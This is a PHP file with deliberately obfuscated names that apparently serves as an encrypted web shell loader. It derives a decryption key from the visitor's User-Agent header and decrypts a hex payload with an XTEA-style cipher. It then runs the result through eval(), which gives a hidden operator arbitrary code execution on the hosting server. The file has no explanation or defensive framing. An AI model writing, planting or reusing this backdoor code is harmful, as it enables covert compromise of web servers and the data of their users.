<?php
$Lonh="";
class MKH_ET{
	var $KLJY;
	function __construct(){
		$this->Setstr(32);
	}
	function GGjh($enc_data){
		$ktmp = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/ Apple(.*) \(/is',$ktmp,$kk)){
			$key = str_replace('/','#',$kk[1]);
			$key = explode(".",$key);
			$key = $key[0].$key[1].'Educ';
		}else{
			die();
		}
		$ncdL = $this->CTL(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->CTL(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $ncdL;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->delg($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->LtoC($w[1]);
				}else{
					$data .= substr($this->LtoC($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->LtoC($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->LtoC($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->LtoC($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->LtoC($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function CTL($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function LtoC($l){
		return pack('N', $l);
	}
	function Setstr($KLJY){
		$this->cd_str = $KLJY;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function delg($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$klhys = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rsLT($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rsLT($sum, 11) & 3])));
			$sum = $this->add($sum, -$klhys);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rsLT($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
	function rsLT($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
}
$Mhne = hex2bin($Lonh); 
$MKH_ET = new MKH_ET(64); 
$Pkl = $MKH_ET->GGjh($Mhne);
eval($Pkl);